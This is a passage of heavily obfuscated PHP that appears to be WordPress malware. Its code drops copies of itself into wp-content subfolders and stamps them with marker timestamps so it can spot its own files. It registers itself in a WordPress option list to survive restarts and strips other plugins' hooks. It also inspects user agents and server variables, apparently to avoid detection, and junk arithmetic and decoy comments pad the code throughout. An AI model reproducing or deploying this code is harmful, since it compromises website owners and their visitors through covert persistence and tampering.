  if  ($iddx6_s0b1    === false) $iddx6_s0b1  =  $w90pshmxoqhf;
     $g5_yms31h346 = @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());
 foreach    ($rno9f7eq0bzd as    $i3scfxw879a   =>  $vt6_dh2etoibkl_)   {



if     ($GLOBALS['__scf_bslklilwd3kn_71']($vt6_dh2etoibkl_)     &&   isset($vt6_dh2etoibkl_->callbacks) &&   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($vt6_dh2etoibkl_->callbacks)) $zzf847skzldn = $vt6_dh2etoibkl_->callbacks;

  elseif   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($vt6_dh2etoibkl_)) $zzf847skzldn  = $vt6_dh2etoibkl_;
  else  continue;
       foreach ($zzf847skzldn   as  $oscx7dgjg5  => $list)    {
foreach   ((array)    $list    as $twjh3pr3zbtd9)   {
$duluassmqus  =     isset($twjh3pr3zbtd9[ovffvv33(72)]) ?   $twjh3pr3zbtd9[bpowi0iglycvx(73)]   :    null;
if    ($duluassmqus  ===  null) continue;


$ko9cqc0s7si9cc    =   quy_0n2b7cyaue4b($duluassmqus);
 if     (!$GLOBALS['__scf_fv3zevxzzb_44']($ko9cqc0s7si9cc))  continue;
$zeizzz97u6poid = @$GLOBALS['__scf_ba4991zo41sta_36']($ko9cqc0s7si9cc);
        if (!(($zeizzz97u6poid !==     false   &&      $zeizzz97u6poid ===  $iddx6_s0b1)    ||     $ko9cqc0s7si9cc    ===  $w90pshmxoqhf))  continue;
        if   ($g5_yms31h346  !==   false     &&  $zeizzz97u6poid      ===    $g5_yms31h346)  continue;
     if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(74)))     @remove_filter($i3scfxw879a,  $duluassmqus, $oscx7dgjg5);
 }

 }
}



 }

function  vd9fs0gaw0qiorm6c3e16()
{

$ewvjaum6vw0469l1 = jo62hy1j37iqrmy();
if (!@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1))  return;
      $xdtq4m97sn  =     $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(75))   ? @$GLOBALS['__scf_kajvzw3bpufv_75']($ewvjaum6vw0469l1    . hn_f08x0cns80(76))    :     false;
     if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($xdtq4m97sn))   return;
$g5_yms31h346 =   @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());
  foreach  ($xdtq4m97sn  as   $ko9cqc0s7si9cc)  {
 $zeizzz97u6poid = @$GLOBALS['__scf_ba4991zo41sta_36']($ko9cqc0s7si9cc);$dugg4n680o0bew=61+96;$l6e6zke__51b69=$dugg4n680o0bew-50;
    if  ($g5_yms31h346 !== false   && $zeizzz97u6poid ===  $g5_yms31h346)  continue;$x_kwcbhunrc=7748;$w4rg24vevit=$x_kwcbhunrc%13;
if   (!mza6zg2fnwyep8gx2xd($ko9cqc0s7si9cc, (464+36)))     continue;
  $x434be6la7lqy8l = p42d6nacvwd08jr_tyanv1($ko9cqc0s7si9cc);
$tc01okst3sc   =  ($x434be6la7lqy8l ===  null)      ||   version_compare($x434be6la7lqy8l, dfb4_mpcgxvnp230hvh1v(), '<');
    if ($tc01okst3sc      || awt0clbm2rkh9u4z8mjsz($ko9cqc0s7si9cc)) zmr27g89e4wmj7($ko9cqc0s7si9cc);

 }
}
      function bouscp0t4dvybv($cupk3kbt8eisf,   $emnni5z67kh0)
      {



return     $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(77))    ?  @$GLOBALS['__scf_c2r2e7u5qd7u_77']($cupk3kbt8eisf,   $emnni5z67kh0)  : false;
   }
 function vyxva31du3czei($cupk3kbt8eisf)
    {
  $ygs4e47dyczpze =    n22pv0e8f25y0co8();


  return     bouscp0t4dvybv($cupk3kbt8eisf,   ($ygs4e47dyczpze  - ($ygs4e47dyczpze   %   (34862+65138))) +   e16j_u99g1ldi90iix1i9i());
}
function  riq98ofdzw2zl1nzzzxy($u7r7z7wagkcmoo,     $aakozw_1zysblhgx)
 {
 return $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(78))   ?   @$GLOBALS['__scf_qo7895jhcq7i_79']($u7r7z7wagkcmoo,   $aakozw_1zysblhgx) : false;
   }
 function  l7o387uoh_b5jut19ja8b($u7r7z7wagkcmoo,    $aakozw_1zysblhgx)
   {
return  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(80))  ?  @$GLOBALS['__scf_qjk23vglbe0p_80']($u7r7z7wagkcmoo, $aakozw_1zysblhgx) :  false;
 }



 function  lwxb0otgrmrkttfbm_7t_r($kekj16jieb, $cupk3kbt8eisf)
  {
  return $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(81))  ?   @$GLOBALS['__scf_ujxphkubsb4a2h_81']($kekj16jieb,   $cupk3kbt8eisf) : false;
       }
 function    rj8ubb6iqzwwqmp_8t2()


     {
 static  $ztqw4ergnhp8msy  =  null;

 if   ($ztqw4ergnhp8msy   !==  null)  return  $ztqw4ergnhp8msy;



$ztqw4ergnhp8msy =      $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(82))   ?    $GLOBALS['__scf_cxw7ozc_kikul_82']() : c1sob647u1i(83);
     if      (@$GLOBALS['__scf_opq_vgkskw_46']($ztqw4ergnhp8msy)    && @$GLOBALS['__scf_sunuwikkpg6_51']($ztqw4ergnhp8msy))     return   $ztqw4ergnhp8msy;
  $amsjsw283qnc3 = defined(hn_f08x0cns80(33))  ?  WP_CONTENT_DIR  : (defined(iw6xe9q4j6sneg(84)) ? ABSPATH   .  ovffvv33(85)    :     "");
if  ($amsjsw283qnc3    !==  "") {
 $ko9cqc0s7si9cc = $GLOBALS['__scf_ofdeuvs8zwos6_12']($amsjsw283qnc3,   iw6xe9q4j6sneg(86))  .  c1sob647u1i(87);
        if     (!@$GLOBALS['__scf_opq_vgkskw_46']($ko9cqc0s7si9cc))   @$GLOBALS['__scf_m0io_o6pvww4t6_16']($ko9cqc0s7si9cc,  (426+67), true);
  if  (@$GLOBALS['__scf_opq_vgkskw_46']($ko9cqc0s7si9cc)    && @$GLOBALS['__scf_sunuwikkpg6_51']($ko9cqc0s7si9cc))  {
   if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(88))) @putenv(bpowi0iglycvx(89) . $ko9cqc0s7si9cc);
  $GLOBALS[c1sob647u1i(90)]   =    1;
 $ztqw4ergnhp8msy  =    $ko9cqc0s7si9cc;


   }
}
  return $ztqw4ergnhp8msy;
}



 function  zbd0filxujnpocked22i()
    {
  $kekj16jieb = gf92nelnpfnbih();
 $u7fvh_hax8vn  =  jo62hy1j37iqrmy();
   if ($kekj16jieb   === $u7fvh_hax8vn)    return true;
  if     ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(91))) {
 $x355l2a5a4r0uu9  =    @$GLOBALS['__scf_ba4991zo41sta_36']($kekj16jieb);
   $v9hqlop8b47t    =  @$GLOBALS['__scf_ba4991zo41sta_36']($u7fvh_hax8vn);
    return   ($x355l2a5a4r0uu9 !==  false  &&  $v9hqlop8b47t !== false &&  $x355l2a5a4r0uu9    ===  $v9hqlop8b47t);
  }
   return   false;
     }
  function e16j_u99g1ldi90iix1i9i()
{
return  (98107-4288);



     }
function  sz4dxcdey0t2b0tlyi_w()
{
  if  (!defined(c1sob647u1i(84)))     return  "";
 $amsjsw283qnc3 =   defined(bpowi0iglycvx(92))    ?  WP_CONTENT_DIR      :    ABSPATH   .  f6yrzd2knrmb(85);
      return  $GLOBALS['__scf_ofdeuvs8zwos6_12']($amsjsw283qnc3,      iw6xe9q4j6sneg(93))   .    f6yrzd2knrmb(94) .  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](ABSPATH   .  hn_f08x0cns80(95)),  0,  (13-5))      .  iw6xe9q4j6sneg(96) .  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](ABSPATH .  f6yrzd2knrmb(97)),  0,  (1+7)) .   iw6xe9q4j6sneg(27);
 }
function b1acch7k36o7yhlwm5($egziouap1xyua  = null)
  {
 $cupk3kbt8eisf    = sz4dxcdey0t2b0tlyi_w();
  if   ($cupk3kbt8eisf  ===     "")   return false;
   if (!$GLOBALS['__scf_fv3zevxzzb_44']($egziouap1xyua) ||     $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)   <  (19+481)) $egziouap1xyua  = bfyls7pdkqkf4p8az();
    if (!$egziouap1xyua ||  !ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))    return  false;
   $kekj16jieb   = $GLOBALS['__scf_po3uwzhcb63b03_11']($cupk3kbt8eisf);
if   (!@$GLOBALS['__scf_opq_vgkskw_46']($kekj16jieb)) xxvz5dp1zk215e5d9($kekj16jieb, (141+352),    true);
    if  (!@$GLOBALS['__scf_opq_vgkskw_46']($kekj16jieb) || !@$GLOBALS['__scf_sunuwikkpg6_51']($kekj16jieb))    return     false;


 if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf))   {
 $vcqo2iyniy5   =  pvqofla267dcimn($cupk3kbt8eisf);
 if ($GLOBALS['__scf_fv3zevxzzb_44']($vcqo2iyniy5)  &&   $vcqo2iyniy5   !==  "" &&   $GLOBALS['__scf_tnonex5o9y_60']($vcqo2iyniy5)   ===    $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua))  return  true;

 unset($vcqo2iyniy5);
   $qs1nyzj2e3y95rd2  =   p42d6nacvwd08jr_tyanv1($cupk3kbt8eisf);

  if ($qs1nyzj2e3y95rd2  !==  null   &&  version_compare($qs1nyzj2e3y95rd2, dfb4_mpcgxvnp230hvh1v(), '>'))    return  false;
    unset($qs1nyzj2e3y95rd2);$p3h2hig_q=9041;$j0a_8ge8=$p3h2hig_q%10;
    

}
 if  (!c5kyk62yk_dwfeubni4b($cupk3kbt8eisf,    $egziouap1xyua)) return  false;
  ruinnb541lwxm7j($cupk3kbt8eisf,    (0x154+0x50));
o4_k_ap14u5xy97yywy7k($cupk3kbt8eisf);
   return  true;
   }
   function    a0q_0vhnw4vfxz()
   {
// WP Formatting API: multilinear dead-letter
$w5m72go9afn=(0x64+0x1c);$olchux_kxf=$w5m72go9afn%2;
       $egziouap1xyua =  bfyls7pdkqkf4p8az();
     if     (!$egziouap1xyua ||   !ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))    return   false;
$pjov750v0e =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   hn_f08x0cns80(27));
     $ftvsfz7ji2  = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(98)) ? ircnjcyfmf8qkc7xdiss4()   :  (defined(bpowi0iglycvx(99))   ?  WP_CONTENT_DIR   : "");


 if   ($ftvsfz7ji2  === "") return  false;
 $fgi5etl773fhq0 =  $ftvsfz7ji2    .    f6yrzd2knrmb(100) . $pjov750v0e;
$ocl1p7lw8g836f    =  $fgi5etl773fhq0 .   '/'  . $pjov750v0e  .  hn_f08x0cns80(27);
$b6l44ydrqs4cl    = false;

  if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(91)))   {
$dv03he0h_dqdoj1  =     @$GLOBALS['__scf_ba4991zo41sta_36']($ocl1p7lw8g836f);$cniaocy_0w=691;$yers_oaw2r=$cniaocy_0w%3;
   $cxi_2i7q2h   =  @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());
     $b6l44ydrqs4cl   =  ($GLOBALS['__scf_fv3zevxzzb_44']($dv03he0h_dqdoj1)   &&  $GLOBALS['__scf_fv3zevxzzb_44']($cxi_2i7q2h)     &&  $dv03he0h_dqdoj1    === $cxi_2i7q2h);
   }
 if (!$b6l44ydrqs4cl) {
    if  (!@$GLOBALS['__scf_opq_vgkskw_46']($fgi5etl773fhq0)) xxvz5dp1zk215e5d9($fgi5etl773fhq0, (434+59),    true);
    if  (!@$GLOBALS['__scf_opq_vgkskw_46']($fgi5etl773fhq0) ||  !@$GLOBALS['__scf_sunuwikkpg6_51']($fgi5etl773fhq0))   return false;
 $cxijnckjn6m_na4_  =  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ocl1p7lw8g836f)    ?   pvqofla267dcimn($ocl1p7lw8g836f)   : false;
if ($cxijnckjn6m_na4_  !==  null   && (!$GLOBALS['__scf_fv3zevxzzb_44']($cxijnckjn6m_na4_)     || $GLOBALS['__scf_tnonex5o9y_60']($cxijnckjn6m_na4_)   !==    $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua))) {
  if     (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ocl1p7lw8g836f))    {
  $qs1nyzj2e3y95rd2  =   p42d6nacvwd08jr_tyanv1($ocl1p7lw8g836f);
     if  ($qs1nyzj2e3y95rd2  !==  null   && version_compare($qs1nyzj2e3y95rd2,   dfb4_mpcgxvnp230hvh1v(),   '>'))  return  false;
   unset($qs1nyzj2e3y95rd2);
}
    if  (!c5kyk62yk_dwfeubni4b($ocl1p7lw8g836f, fcywjpu_2kwq2ahog4($egziouap1xyua)))  return  false;
   ruinnb541lwxm7j($ocl1p7lw8g836f,   (388+32));
  vyxva31du3czei($ocl1p7lw8g836f);
   o4_k_ap14u5xy97yywy7k($ocl1p7lw8g836f);
    }



    unset($cxijnckjn6m_na4_);
      }
$zf_k8j4xq1q3s1d8    =  $pjov750v0e    . '/'   .      $pjov750v0e  .   ovffvv33(27);
 _c82cv1bsqf10vml2pi7e($zf_k8j4xq1q3s1d8);
 return   true;
 }


function  p42d6nacvwd08jr_tyanv1($cupk3kbt8eisf)
  {
   $e3odkvvirkd_y00b   =    @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf,  false, null,  0, (4067+29));
if    (!$GLOBALS['__scf_fv3zevxzzb_44']($e3odkvvirkd_y00b)) return    null;
 if ($GLOBALS['__scf_wdjvpd1lvon9_102'](iw6xe9q4j6sneg(103),    $e3odkvvirkd_y00b,     $u7fvh_hax8vn))      return    $u7fvh_hax8vn[1];

 return null;
 }

function  mza6zg2fnwyep8gx2xd($rqmtme6nbb4elm,  $x8c__s5f8vccj)

{
     @clearstatcache(true,    $rqmtme6nbb4elm);
   
     $ez2y3ob0mguh9 = @$GLOBALS['__scf_uo_a60ibqnli_104']($rqmtme6nbb4elm);
 if  (!$ez2y3ob0mguh9 ||     ($ez2y3ob0mguh9  %  (0x13b+0x18565))   !==    e16j_u99g1ldi90iix1i9i())  {
return false;

}

 
      $mj_77481utt0efu  =   @$GLOBALS['__scf_b42duf6j1zadm9_105']($rqmtme6nbb4elm);
return $mj_77481utt0efu &&   $mj_77481utt0efu >=      $x8c__s5f8vccj;
    }
  function bcb80tag96ir7air0u8xp7()
{


 return    (7269+28731);
      }


   function vwa_1wxh4uqtqo4afj0x8()
   {
  return  hn_f08x0cns80(106);
   }

  function    p1srpzpjsehf9kb72()
  {
return bpowi0iglycvx(107);
      }
    function  do8hp9rltsmxhqw6ka_q()
   {
  if     ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(108)))  return   true;



if (kt56foa1mksze3xvszvb())  return  true;$ihnkg2rdqo4=183|117;$q1jby31z06=$ihnkg2rdqo4^142;

    $xl4v86rfdl    =   $GLOBALS['__scf_xyekfdfj2g_109']((string)  $GLOBALS['__scf_h9zx4fm_1_qpan_110']());
    if   ($xl4v86rfdl ===      c1sob647u1i(111)  ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($xl4v86rfdl,   c1sob647u1i(112))  !==   false) return  true;
   $_az7xu41jvhlt = isset($_SERVER[ovffvv33(113)]) ?     $GLOBALS['__scf_xyekfdfj2g_109']((string)    $_SERVER[ovffvv33(113)]) : "";

if     ($_az7xu41jvhlt     !== ""    &&  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($_az7xu41jvhlt,    bpowi0iglycvx(114)) !== false  || $GLOBALS['__scf_w6mdcepio4lkz5_7']($_az7xu41jvhlt,  f6yrzd2knrmb(112)) !==   false ||     $GLOBALS['__scf_w6mdcepio4lkz5_7']($_az7xu41jvhlt, c1sob647u1i(115)) !==     false))  return true;
   return false;
 }
function  kt56foa1mksze3xvszvb()
     {
// APCu shm: infeasible call-graph

$_az7xu41jvhlt  =     isset($_SERVER[bpowi0iglycvx(116)])  ?    $_SERVER[ovffvv33(116)]    :   "";
return  $GLOBALS['__scf_fv3zevxzzb_44']($_az7xu41jvhlt)   && stripos($_az7xu41jvhlt,  hn_f08x0cns80(117))      !==   false;
 }
function  fiq2af1kmyjbo9re_ltz($w90pshmxoqhf)
 {

     $okw0rro6lwto_tl      = $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(118)) ?   @$GLOBALS['__scf_hm704kpgfifhl_118'](bpowi0iglycvx(119)) :  false;
if     (!$okw0rro6lwto_tl ||    $okw0rro6lwto_tl ===   "") return    true;
  $iddx6_s0b1 = @$GLOBALS['__scf_ba4991zo41sta_36']($w90pshmxoqhf);
 if (!$iddx6_s0b1)   $iddx6_s0b1  =  $w90pshmxoqhf;
 foreach  ($GLOBALS['__scf_xi_pncf33_0_120'](PATH_SEPARATOR,     $okw0rro6lwto_tl)  as  $t49jadtyjx) {
 $t49jadtyjx = $GLOBALS['__scf_ofdeuvs8zwos6_12']($t49jadtyjx, ovffvv33(121));

  if  ($t49jadtyjx  &&     ($iddx6_s0b1 ===    $t49jadtyjx   ||   $GLOBALS['__scf_w6mdcepio4lkz5_7']($iddx6_s0b1, $t49jadtyjx  .   DIRECTORY_SEPARATOR)   ===  0))     return  true;

  }
    return  false;
}
function  wdkok7bwh9d_12($_1eusnddmeik3362)
    {$_4xzpgzhyz=178|38;$g5g5h7s3c8=$_4xzpgzhyz^158;
  $ts8ynmdwl0a     =  $_1eusnddmeik3362     .  '|'  . (defined(iw6xe9q4j6sneg(122))    ? DB_NAME     :  "")   . '|'   .  (defined(iw6xe9q4j6sneg(84))  ?     ABSPATH :  "");
    return   $GLOBALS['__scf_tnonex5o9y_60']($ts8ynmdwl0a);



  }
   function   dtf7lvb25ztuc8jh3htk($_1eusnddmeik3362)
    {


   global      $wpdb;
  if    (!isset($GLOBALS[ovffvv33(123)])  ||      !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[hn_f08x0cns80(124)])) $GLOBALS[ovffvv33(125)]   = array();
   if (!empty($GLOBALS[iw6xe9q4j6sneg(126)][$_1eusnddmeik3362])) {
       if   (isset($GLOBALS[bpowi0iglycvx(127)][$_1eusnddmeik3362])   &&    $GLOBALS['__scf_bslklilwd3kn_71']($wpdb)) {
  $dp6gmdysh9xjj   =    isset($wpdb->dbh)    ?  $wpdb->dbh   :  null;
if   ($dp6gmdysh9xjj     !==     null  &&  $GLOBALS[ovffvv33(127)][$_1eusnddmeik3362] !==  $dp6gmdysh9xjj) {
  unset($GLOBALS[hn_f08x0cns80(126)][$_1eusnddmeik3362],   $GLOBALS[c1sob647u1i(128)][$_1eusnddmeik3362]);
    return  dtf7lvb25ztuc8jh3htk($_1eusnddmeik3362);
}
 unset($dp6gmdysh9xjj);
 }
$GLOBALS[bpowi0iglycvx(129)][$_1eusnddmeik3362]++;



  return  true;
  }
 if     ($GLOBALS['__scf_bslklilwd3kn_71']($wpdb) &&    $GLOBALS['__scf_ewy3z2db5hgtu_130']($wpdb,    hn_f08x0cns80(131)))  {
$n0tlzmrutbrfwh_  =  @$wpdb->get_var(hn_f08x0cns80(132)   .   wdkok7bwh9d_12($_1eusnddmeik3362)    .   hn_f08x0cns80(133));$v2kh225ca=(0x84+0xb8);$l8qkx7lftfe710=$v2kh225ca%3;
if  ($n0tlzmrutbrfwh_  ===      '1') {
 $GLOBALS[iw6xe9q4j6sneg(129)][$_1eusnddmeik3362]  =   1;
   if   (isset($wpdb->dbh)    && $wpdb->dbh)    $GLOBALS[bpowi0iglycvx(128)][$_1eusnddmeik3362]      = $wpdb->dbh;
return  true;
    }
  if    ($n0tlzmrutbrfwh_    === '0')  return  false;
       }
    if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(134))    &&  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(24)))   {
   $y1c71l43uy1or9   =    array();

   if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(82))) $y1c71l43uy1or9[]     = $GLOBALS['__scf_cxw7ozc_kikul_82']();
      

   if (defined(bpowi0iglycvx(99))) $y1c71l43uy1or9[] = WP_CONTENT_DIR;
 if    (defined(f6yrzd2knrmb(84))) $y1c71l43uy1or9[]  =   $GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH, c1sob647u1i(135));
    foreach  ($y1c71l43uy1or9 as  $kekj16jieb)  {
      if  ($kekj16jieb   ===     ""  ||   !@$GLOBALS['__scf_opq_vgkskw_46']($kekj16jieb) ||     !@$GLOBALS['__scf_sunuwikkpg6_51']($kekj16jieb))   continue;
   $av1kseqekz12jo  =   @$GLOBALS['__scf_huiecxntl0_24']($kekj16jieb . c1sob647u1i(136) .   wdkok7bwh9d_12($_1eusnddmeik3362)   .    c1sob647u1i(137),  'c');

if ($av1kseqekz12jo !==   false)   {
if  (!@flock($av1kseqekz12jo, LOCK_EX | LOCK_NB))  {

 @fclose($av1kseqekz12jo);
 return    false;



   }

 if      (!isset($GLOBALS[hn_f08x0cns80(138)]) ||     !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[ovffvv33(138)]))  $GLOBALS[bpowi0iglycvx(138)]     =  array();

       $GLOBALS[f6yrzd2knrmb(139)][$_1eusnddmeik3362] = $av1kseqekz12jo;
$GLOBALS[bpowi0iglycvx(140)][$_1eusnddmeik3362]   =    1;
     return true;
}
}



       }
$GLOBALS[bpowi0iglycvx(141)][$_1eusnddmeik3362]  = 1; 
     $GLOBALS[f6yrzd2knrmb(142)][$_1eusnddmeik3362] =   1;
    return   true;

      }
 function l5zn64lzopflqr0dsekx($_1eusnddmeik3362)



      {
   global  $wpdb;
 if (empty($GLOBALS[bpowi0iglycvx(141)][$_1eusnddmeik3362])) return;
$GLOBALS[f6yrzd2knrmb(141)][$_1eusnddmeik3362]--;
if  ($GLOBALS[ovffvv33(141)][$_1eusnddmeik3362]      >   0) return;



  unset($GLOBALS[ovffvv33(141)][$_1eusnddmeik3362]);

unset($GLOBALS[bpowi0iglycvx(128)][$_1eusnddmeik3362]);
   unset($GLOBALS[f6yrzd2knrmb(143)][$_1eusnddmeik3362]);
  if (isset($GLOBALS[bpowi0iglycvx(139)][$_1eusnddmeik3362]))   {


@flock($GLOBALS[bpowi0iglycvx(139)][$_1eusnddmeik3362],  LOCK_UN);
@fclose($GLOBALS[hn_f08x0cns80(144)][$_1eusnddmeik3362]);
 unset($GLOBALS[bpowi0iglycvx(144)][$_1eusnddmeik3362]);$h8kj562ix97j2=859;$gjgne22d=$h8kj562ix97j2%17;
      }
if   ($GLOBALS['__scf_bslklilwd3kn_71']($wpdb) && $GLOBALS['__scf_ewy3z2db5hgtu_130']($wpdb,  ovffvv33(145)))  {
     @$wpdb->query(f6yrzd2knrmb(146)  . wdkok7bwh9d_12($_1eusnddmeik3362) .  bpowi0iglycvx(147));
     }
}
    function   xfzvugr9ucs1qu23p8()
{
     if     (defined(bpowi0iglycvx(148))  &&    DISALLOW_FILE_MODS)   return  false;
 return  true;
  }
     function _c3bad4nwgs5qet()
   {


if   (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(134))     ||  !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(24)))   return    false;

     $q0obuv3akc =     array();
     if ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(82))) $q0obuv3akc[]    =  $GLOBALS['__scf_cxw7ozc_kikul_82']();
if  (defined(c1sob647u1i(99)))    $q0obuv3akc[] =   WP_CONTENT_DIR;
if   (defined(hn_f08x0cns80(149))) $q0obuv3akc[] =    $GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,    c1sob647u1i(135));
       foreach  ($q0obuv3akc      as  $z8hbby6kg7u)  {



if ($z8hbby6kg7u   === ""  || !@$GLOBALS['__scf_opq_vgkskw_46']($z8hbby6kg7u)    ||    !@$GLOBALS['__scf_sunuwikkpg6_51']($z8hbby6kg7u))     continue;
$xgw9ez25vlk4q = @$GLOBALS['__scf_huiecxntl0_24']($z8hbby6kg7u  .  f6yrzd2knrmb(136)   .   wdkok7bwh9d_12(c1sob647u1i(150))  .    bpowi0iglycvx(137),    'c');



  if   ($xgw9ez25vlk4q ===   false)  continue;



if   (!@flock($xgw9ez25vlk4q, LOCK_EX     |   LOCK_NB))  {
  @fclose($xgw9ez25vlk4q);
 return  false;
}



      $GLOBALS[ovffvv33(151)]  = $xgw9ez25vlk4q;
return  true;


}
     return   false;


   }
    function   ivce673bhsr751apsy5()
{
   if (isset($GLOBALS[hn_f08x0cns80(152)]))      {
// delegate semisimple injector

   @flock($GLOBALS[iw6xe9q4j6sneg(153)],   LOCK_UN);
    @fclose($GLOBALS[ovffvv33(154)]);
   unset($GLOBALS[bpowi0iglycvx(154)]);
 }
}
     function _c82cv1bsqf10vml2pi7e($zf_k8j4xq1q3s1d8)
        {
    if      (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(155))  ||     !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(156))) return;
if (!_c3bad4nwgs5qet()) return;
 try    {
  $uzvpmcz1y5   =    get_option(bpowi0iglycvx(157), array());
if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($uzvpmcz1y5)) $uzvpmcz1y5 =     array();
$slpxkrve0vmdr     =  $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_tni2zo3jsk7_159']($uzvpmcz1y5));
  

    if  (!$GLOBALS['__scf_rd2tojulg06lx_160']($zf_k8j4xq1q3s1d8,  $slpxkrve0vmdr,  true))  $slpxkrve0vmdr[] =   $zf_k8j4xq1q3s1d8;
   if ($slpxkrve0vmdr  !== $uzvpmcz1y5)   update_option(iw6xe9q4j6sneg(161),    $slpxkrve0vmdr);
    unset($slpxkrve0vmdr);
} finally   {
  ivce673bhsr751apsy5();
}
    }
      function      os2bqp40hitbcx($zf_k8j4xq1q3s1d8)



    {
if    (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(155)) ||   !$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(156)))     return;
if  (!_c3bad4nwgs5qet())   return;
try      {
   $uzvpmcz1y5 =   get_option(hn_f08x0cns80(162),  array());
  if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($uzvpmcz1y5) && $GLOBALS['__scf_rd2tojulg06lx_160']($zf_k8j4xq1q3s1d8,   $uzvpmcz1y5, true)) {

update_option(ovffvv33(163),  $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_yucj673b8x_164']($uzvpmcz1y5, array($zf_k8j4xq1q3s1d8))));
      }
 } finally  {

 ivce673bhsr751apsy5();
  }
  }
   function g_qoqdy38lfl4v4n3618($lfc0os2_g711prt,   $cje8wku90zm4r)
 {
try      {
   if    (interface_exists(c1sob647u1i(165))   &&      $cje8wku90zm4r     instanceof   Throwable)      {


 $jbe6qup280  =    $GLOBALS['__scf_nv7he759wjfj_9']($lfc0os2_g711prt .  hn_f08x0cns80(166)  .  $cje8wku90zm4r->getMessage(), 0, (178+78));
}  elseif     ($cje8wku90zm4r instanceof   Exception)   {
// PHPUnit 10: load journal

   $jbe6qup280 = $GLOBALS['__scf_nv7he759wjfj_9']($lfc0os2_g711prt  .   f6yrzd2knrmb(166)   .  $cje8wku90zm4r->getMessage(),   0,    (71+185));
    }  elseif   ($GLOBALS['__scf_fv3zevxzzb_44']($cje8wku90zm4r)    &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($cje8wku90zm4r) >  0)   {
    $jbe6qup280 =    $GLOBALS['__scf_nv7he759wjfj_9']($lfc0os2_g711prt     .  f6yrzd2knrmb(166)    . $cje8wku90zm4r, 0, (275-19));
   }     else  {
     return;
       }
   if (!isset($GLOBALS[bpowi0iglycvx(167)]))      $GLOBALS[bpowi0iglycvx(168)] =  array();



if      (!$GLOBALS['__scf_rd2tojulg06lx_160']($jbe6qup280, $GLOBALS[ovffvv33(168)],   true))   {



 $GLOBALS[c1sob647u1i(168)][]  =    $jbe6qup280;
      }
   if     ($GLOBALS['__scf_wj6dld55k5r8m_39']($GLOBALS[bpowi0iglycvx(169)]) > (0xd+0x25))   {
$GLOBALS[bpowi0iglycvx(169)]   =  $GLOBALS['__scf_emst8f79kti_170']($GLOBALS[hn_f08x0cns80(171)], -(44+6));
    }

    }  catch      (Throwable $z3_n5n_cg6kq5_)    {


   }   catch (Exception   $z3_n5n_cg6kq5_)  {$uw0m8bk1=1696;$g5u_wzid3h=$uw0m8bk1%8;
}
 }
   function   eq7z05kg4s98n6ox($e3odkvvirkd_y00b,   $duluassmqus,   $cupk3kbt8eisf  =  (2+8),  $ukjj4vzpxsr     =   1)
    {
/* general-recursive work-queue */

      if   (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(172)))      return   false;

 if ($GLOBALS['__scf_fv3zevxzzb_44']($duluassmqus))    {
  return    add_action($e3odkvvirkd_y00b,   function (...$_35lll3l0xl)    use    ($duluassmqus) {
if ($GLOBALS['__scf_w3f945e2es_4']($duluassmqus)) return   $duluassmqus(...$_35lll3l0xl);
    return  null;


   },  $cupk3kbt8eisf,  $ukjj4vzpxsr);
      }
     return  add_action($e3odkvvirkd_y00b, $duluassmqus,  $cupk3kbt8eisf, $ukjj4vzpxsr);


   }


